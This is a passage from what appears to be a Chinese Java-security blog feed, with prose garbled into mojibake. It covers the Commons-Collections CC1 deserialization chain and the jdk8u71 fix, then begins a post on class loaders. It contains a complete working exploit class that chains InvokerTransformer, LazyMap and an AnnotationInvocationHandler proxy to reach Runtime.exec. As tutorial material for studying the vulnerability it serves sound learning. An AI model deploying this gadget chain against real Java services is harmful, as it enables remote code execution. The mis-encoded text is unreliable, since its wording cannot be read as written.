ç”¨çš„æ˜¯é»˜è®¤å€¼</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>æ— å‚æ–¹æ³•æ˜¯è°çš„æ–¹æ³•</li></ol><p>åœ¨æ³¨è§£é‡Œï¼Œ<strong>æ¯ä¸ªâ€œå±æ€§â€å…¶å®å°±æ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•</strong>ã€‚<br> æ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@interface</span> MyAnno &#123;<br>    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">age</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-number">18</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ƒåœ¨ç¼–è¯‘åå˜æˆæ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyAnno</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span> &#123;<br>    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;   <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">age</span><span class="hljs-params">()</span>;        <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼š</p><ul><li><code>value()</code>ã€<code>age()</code> <strong>çœ‹èµ·æ¥åƒå±æ€§</strong>ï¼Œä½†æœ¬è´¨ä¸Šæ˜¯ <strong>æ— å‚æ–¹æ³•</strong>ã€‚</li><li>è°ƒç”¨ <code>myAnno.value()</code> çš„æ—¶å€™ï¼Œå®é™…ä¸Š JVM æ˜¯é€šè¿‡ <strong>åŠ¨æ€ä»£ç†</strong> è°ƒç”¨åˆ°ä½ è´´çš„ <code>invoke()</code> æ–¹æ³•ã€‚</li><li>åœ¨ <code>invoke()</code> é‡Œï¼Œ<code>method.getName()</code> å°±ä¼šå¾—åˆ° <code>&quot;value&quot;</code> æˆ– <code>&quot;age&quot;</code>ï¼Œç„¶ååˆ° <code>memberValues</code> é‡Œå–å€¼ã€‚</li></ul><ol start="3"><li>ç»“åˆèµ·æ¥çœ‹</li></ol><p>å½“ä½ å†™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MyAnno</span> <span class="hljs-variable">anno</span> <span class="hljs-operator">=</span> Test.class.getAnnotation(MyAnno.class);<br>System.out.println(anno.value());<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ—¶æ‰§è¡Œæµç¨‹æ˜¯ï¼š</p><ol><li><code>anno</code> å…¶å®æ˜¯ä¸€ä¸ª <code>Proxy</code> ä»£ç†å¯¹è±¡ã€‚</li><li>è°ƒç”¨ <code>anno.value()</code> â†’ JVM è°ƒç”¨ <code>invoke(proxy, method, null)</code>ã€‚<ul><li><code>method.getName()</code> &#x3D; <code>&quot;value&quot;</code></li></ul></li><li>åœ¨ <code>memberValues</code> é‡ŒæŸ¥ <code>&quot;value&quot;</code> å¯¹åº”çš„å€¼ã€‚</li><li>è¿”å› <code>&quot;Tom&quot;</code>ã€‚</li></ol><p><strong>æ€»ç»“ä¸€å¥è¯</strong>ï¼š</p><ul><li><code>memberValues</code> å­˜çš„æ˜¯ <strong>æ³¨è§£å±æ€§å â†’ å€¼</strong> çš„æ˜ å°„ã€‚</li><li>æ³¨è§£é‡Œçš„ <strong>å±æ€§æ–¹æ³•</strong>ï¼ˆ<code>value()</code>, <code>age()</code> ç­‰ï¼‰å°±æ˜¯é‚£äº›æ— å‚æ–¹æ³•ã€‚</li></ul><p>ç†è§£äº†è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ç¼–å†™EXPäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//å±é™©å‚æ•°æ„é€ </span><br>        <span class="hljs-comment">//å±é™©æ–¹æ³•ï¼Œæ ¸å¿ƒå±é™©å‚æ•°æ„é€ </span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-comment">//å…¶å®è¿™é‡Œå¯ä»¥ä¸ç”¨è¿™ä¸ªï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦è¿›å…¥setValueæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šé€šè¿‡åå°„è·å–Runtimeç±»çš„getRuntimeæ–¹æ³•</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šè°ƒç”¨getRuntimeæ–¹æ³•è·å–Runtimeå®ä¾‹</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šåœ¨Runtimeå®ä¾‹ä¸Šè°ƒç”¨execæ–¹æ³•æ‰§è¡Œè®¡ç®—å™¨</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">// å°†ä¸‰ä¸ªTransformerç»„åˆæˆé“¾å¼è½¬æ¢å™¨</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-comment">//ç”ŸæˆLazyMapå®ä¾‹</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">// å®ä¾‹åŒ– AnnotationInvocationHandler</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);<br><br>        <span class="hljs-comment">//æ–°å»ºåŠ¨æ€ä»£ç†</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">// æ–°å»ºAnnotationInvocationHandlerå®ä¾‹</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, mapProxy);<br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡ºåˆ©å¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/CC1/c34.png"></p><h3 id="è°ƒç”¨é“¾æ¢³ç†ä¸æ€»ç»“-1"><a href="#è°ƒç”¨é“¾æ¢³ç†ä¸æ€»ç»“-1" class="headerlink" title="è°ƒç”¨é“¾æ¢³ç†ä¸æ€»ç»“"></a>è°ƒç”¨é“¾æ¢³ç†ä¸æ€»ç»“</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">//åˆ©ç”¨é“¾<br>InvokerTransformer#transform<br>LazyMap#get<br>AnnotationInvocationHandler#readObject<br></code></pre></td></tr></table></figure><p><img src="/img/CC1/c35.png"></p><h2 id="ä¿®å¤æ‰‹æ®µ"><a href="#ä¿®å¤æ‰‹æ®µ" class="headerlink" title="ä¿®å¤æ‰‹æ®µ"></a>ä¿®å¤æ‰‹æ®µ</h2><p>å®˜æ–¹è¿™é‡Œçš„æ¨èä¿®å¤æ–¹æ³•æ˜¯å°† jdk ç‰ˆæœ¬æå‡è‡³ jdk8u71ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆå®˜æ–¹ä¼šæ¨èè¿™ç§æ–¹æ³•ã€‚</p><h3 id="1-å¯¹äº-TransformerMap-ç‰ˆçš„-CC1-é“¾å­"><a href="#1-å¯¹äº-TransformerMap-ç‰ˆçš„-CC1-é“¾å­" class="headerlink" title="1. å¯¹äº TransformerMap ç‰ˆçš„ CC1 é“¾å­"></a>1. å¯¹äº TransformerMap ç‰ˆçš„ CC1 é“¾å­</h3><p>å¯¹äº TransformerMap ç‰ˆçš„ CC1 é“¾å­æ¥è¯´ï¼Œjdk8u71 åŠä»¥åçš„ç‰ˆæœ¬æ²¡æœ‰äº†èƒ½è°ƒç”¨ ReadObject ä¸­ <code>setValue()</code> æ–¹æ³•çš„åœ°æ–¹ã€‚</p><p><img src="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/jdk8u71.png" alt="img"></p><h3 id="2-å¯¹äºæ­£ç‰ˆ-CC1-é“¾å­"><a href="#2-å¯¹äºæ­£ç‰ˆ-CC1-é“¾å­" class="headerlink" title="2. å¯¹äºæ­£ç‰ˆ CC1 é“¾å­"></a>2. å¯¹äºæ­£ç‰ˆ CC1 é“¾å­</h3><p>å› ä¸ºåœ¨8u71ä¹‹åçš„ç‰ˆæœ¬ååºåˆ—åŒ–ä¸å†é€šè¿‡<code>defaultReadObject</code>æ–¹å¼ï¼Œè€Œæ˜¯é€šè¿‡<code>readFields</code> æ¥è·å–å‡ ä¸ªç‰¹å®šçš„å±æ€§ï¼Œ<code>defaultReadObject</code> å¯ä»¥æ¢å¤å¯¹è±¡æœ¬èº«çš„ç±»å±æ€§ï¼Œæ¯”å¦‚<code>this.memberValues</code> å°±èƒ½æ¢å¤æˆæˆ‘ä»¬åŸæœ¬è®¾ç½®çš„æ¶æ„ç±»ï¼Œä½†é€šè¿‡<code>readFields</code>æ–¹å¼ï¼Œ<code>this.memberValues</code> å°±ä¸ºnullï¼Œæ‰€ä»¥åç»­æ‰§è¡Œget()å°±å¿…ç„¶æ²¡å‘è§¦å‘ï¼Œè¿™ä¹Ÿå°±æ˜¯é«˜ç‰ˆæœ¬ä¸èƒ½ä½¿ç”¨çš„åŸå› </p><p><img src="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/Suite.png" alt="img"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7?t=994.7">https://www.bilibili.com/video/BV1yP4y1p7N7?t=994.7</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1?t=2743.1">https://www.bilibili.com/video/BV1no4y1U7E1?t=2743.1</a></p><p><a href="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡02-CC1é“¾è¡¥å…… | Drunkbabyâ€™s Blog</a></p><p><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
      <tag>CCé“¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½</title>
    <link href="/2025/08/27/Java%E5%AE%89%E5%85%A8-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    <url>/2025/08/27/Java%E5%AE%89%E5%85%A8-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½"><a href="#Javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½" class="headerlink" title="Javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½"></a>Javaå®‰å…¨-ç±»çš„åŠ¨æ€åŠ è½½</h1><h2 id="ç±»åŠ è½½å™¨åŠåŒäº²å§”æ´¾"><a href="#ç±»åŠ è½½å™¨åŠåŒäº²å§”æ´¾" class="headerlink" title="ç±»åŠ è½½å™¨åŠåŒäº²å§”æ´¾"></a>ç±»åŠ è½½å™¨åŠåŒäº²å§”æ´¾</h2><h3 id="ç±»åŠ è½½å™¨æœ‰ä»€ä¹ˆç”¨"><a href="#ç±»åŠ è½½å™¨æœ‰ä»€ä¹ˆç”¨" class="headerlink" title="ç±»åŠ è½½å™¨æœ‰ä»€ä¹ˆç”¨"></a>ç±»åŠ è½½å™¨æœ‰ä»€ä¹ˆç”¨</h3><ul><li>åŠ è½½ Class æ–‡ä»¶</li></ul><p>ä»¥è¿™æ®µç®€å•ä»£ç ä¸ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“ï¼ŒStudent æœ¬èº«å…¶å®æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ˜¯é€šè¿‡ new è¿™ä¸ªæ“ä½œï¼Œå°†å…¶å®ä¾‹åŒ–çš„ï¼Œ<strong>ç±»åŠ è½½å™¨</strong>åšçš„ä¾¿æ˜¯è¿™ä¸ªå·¥ä½œã€‚</p><p>ClassLoader çš„å·¥ä½œå¦‚å›¾æ‰€ç¤º</p><p><img src="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderWork.png"></p><p>åŠ è½½å™¨ä¹Ÿåˆ†å¤šç§åŠ è½½å™¨ï¼Œæ¯ä¸ªåŠ è½½å™¨è´Ÿè´£ä¸åŒçš„åŠŸèƒ½ã€‚</p><p>ä¸»è¦åˆ†ä¸ºè¿™å››ç§åŠ è½½å™¨</p><blockquote><ol><li>è™šæ‹Ÿæœºè‡ªå¸¦çš„åŠ è½½å™¨</li><li>å¯åŠ¨ç±»ï¼ˆæ ¹ï¼‰åŠ è½½å™¨</li><li>æ‰©å±•ç±»åŠ è½½å™¨</li><li>åº”ç”¨ç¨‹åºåŠ è½½å™¨</li></ol></blockquote><h3 id="å‡ ç§åŠ è½½å™¨"><a href="#å‡ ç§åŠ è½½å™¨" class="headerlink" title="å‡ ç§åŠ è½½å™¨"></a>å‡ ç§åŠ è½½å™¨</h3><h4 id="å¼•å¯¼ç±»åŠ è½½å™¨"><a href="#å¼•å¯¼ç±»åŠ è½½å™¨" class="headerlink" title="å¼•å¯¼ç±»åŠ è½½å™¨"></a>å¼•å¯¼ç±»åŠ è½½å™¨</h4><blockquote><p>å¼•å¯¼ç±»åŠ è½½å™¨(BootstrapClassLoader)ï¼Œåº•å±‚åŸç”Ÿä»£ç æ˜¯ C++ è¯­è¨€ç¼–å†™ï¼Œå±äº JVM ä¸€éƒ¨åˆ†ã€‚</p></blockquote><p>ä¸ç»§æ‰¿ <code>java.lang.ClassLoader</code> ç±»ï¼Œä¹Ÿæ²¡æœ‰çˆ¶åŠ è½½å™¨ï¼Œä¸»è¦è´Ÿè´£åŠ è½½æ ¸å¿ƒ java åº“(å³ JVM æœ¬èº«)ï¼Œå­˜å‚¨åœ¨ <code>/jre/lib/rt.jar</code> ç›®å½•å½“ä¸­ã€‚(åŒæ—¶å¤„äºå®‰å…¨è€ƒè™‘ï¼Œ<code>BootstrapClassLoader</code> åªåŠ è½½åŒ…åä¸º <code>java</code>ã€<code>javax</code>ã€<code>sun</code> ç­‰å¼€å¤´çš„ç±»)ã€‚</p><h4 id="æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtensionsClassLoaderï¼‰"><a href="#æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtensionsClassLoaderï¼‰" class="headerlink" title="æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtensionsClassLoaderï¼‰"></a>æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtensionsClassLoaderï¼‰</h4><p>æ‰©å±•ç±»åŠ è½½å™¨(ExtensionsClassLoader)ï¼Œç”± <code>sun.misc.Launcher$ExtClassLoader</code> ç±»å®ç°ï¼Œç”¨æ¥åœ¨ <code>/jre/lib/ext</code> æˆ–è€… <code>java.ext.dirs</code> ä¸­æŒ‡æ˜çš„ç›®å½•åŠ è½½ java çš„æ‰©å±•åº“ã€‚Java è™šæ‹Ÿæœºä¼šæä¾›ä¸€ä¸ªæ‰©å±•åº“ç›®å½•ï¼Œæ­¤åŠ è½½å™¨åœ¨ç›®å½•é‡Œé¢æŸ¥æ‰¾å¹¶åŠ è½½ java ç±»ã€‚</p><h4 id="Appç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰"><a href="#Appç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰" class="headerlink" title="Appç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰"></a>Appç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰</h4><p>Appç±»åŠ è½½å™¨&#x2F;ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆAppClassLoaderï¼‰ï¼Œç”± <code>sun.misc.Launcher$AppClassLoader</code> å®ç°ï¼Œä¸€èˆ¬é€šè¿‡é€šè¿‡( <code>java.class.path</code> æˆ–è€… <code>Classpath</code> ç¯å¢ƒå˜é‡)æ¥åŠ è½½ Java ç±»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ classpath è·¯å¾„ã€‚é€šå¸¸æˆ‘ä»¬æ˜¯ä½¿ç”¨è¿™ä¸ªåŠ è½½ç±»æ¥åŠ è½½ Java åº”ç”¨ç±»ï¼Œå¯ä»¥ä½¿ç”¨ <code>ClassLoader.getSystemClassLoader()</code> æ¥è·å–å®ƒã€‚</p><h3 id="åŒäº²å§”æ´¾æœºåˆ¶"><a href="#åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="åŒäº²å§”æ´¾æœºåˆ¶"></a>åŒäº²å§”æ´¾æœºåˆ¶</h3><ul><li>åœ¨ Java å¼€å‘å½“ä¸­ï¼ŒåŒäº²å§”æ´¾æœºåˆ¶æ˜¯ä»å®‰å…¨è§’åº¦å‡ºå‘çš„ã€‚</li></ul><h4 id="ä»æŠ¥é”™çš„è§’åº¦æ„Ÿå—åŒäº²å§”æ´¾æœºåˆ¶"><a href="#ä»æŠ¥é”™çš„è§’åº¦æ„Ÿå—åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="ä»æŠ¥é”™çš„è§’åº¦æ„Ÿå—åŒäº²å§”æ´¾æœºåˆ¶"></a>ä»æŠ¥é”™çš„è§’åº¦æ„Ÿå—åŒäº²å§”æ´¾æœºåˆ¶</h4><p>æ–°å»ºä¸€ä¸ª <strong>java.langçš„æ–‡ä»¶å¤¹</strong>ï¼Œåœ¨å…¶ä¸­æ–°å»º <strong>String.java</strong> çš„æ–‡ä»¶ã€‚</p><p><strong>String.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang;  <br>  <br><span class="hljs-comment">// åŒäº²å§”æ´¾çš„é”™è¯¯ä»£ç   </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">String</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>();  <br> s.toString();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è‡ªå·±å®šä¹‰äº†ä¸€ä¸ª <code>java.lang</code> çš„æ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨æ–‡ä»¶å¤¹ä¸­å®šä¹‰äº† String.classï¼Œè¿˜å®šä¹‰äº† String è¿™ä¸ªç±»çš„ toString æ–¹æ³•ã€‚</p><ul><li>è¿è¡Œç¨‹åºåå‘ç°ä¼šæŠ¥é”™</li></ul><p><img src="/img/java%E5%AE%89%E5%85%A8/a30.png"></p><p>æˆ‘ä»¬å®šä¹‰äº†mainæ–¹æ³•ï¼Œä½†æ˜¯ä»ç„¶ä¼šæŠ¥é”™</p><p>ä¸ºä»€ä¹ˆä¼šæŠ¥é”™å‘¢</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦çŸ¥é“ Java çš„ç±»åŠ è½½å™¨æ˜¯åˆ†å¾ˆå¤šå±‚çš„ï¼Œå¦‚å›¾ã€‚</p><p><img src="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderSequence.png"></p><p>ç”±äºç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æœºåˆ¶é™åˆ¶ï¼Œç±»åŠ è½½å™¨åœ¨è¢«è°ƒç”¨æ—¶ä¹Ÿå°±æ˜¯åœ¨ new class çš„æ—¶å€™ï¼Œå®ƒæ˜¯ä»¥è¿™ä¹ˆä¸€ä¸ªé¡ºåºå»æ‰¾çš„ BOOT â€”&gt; EXC â€”-&gt; 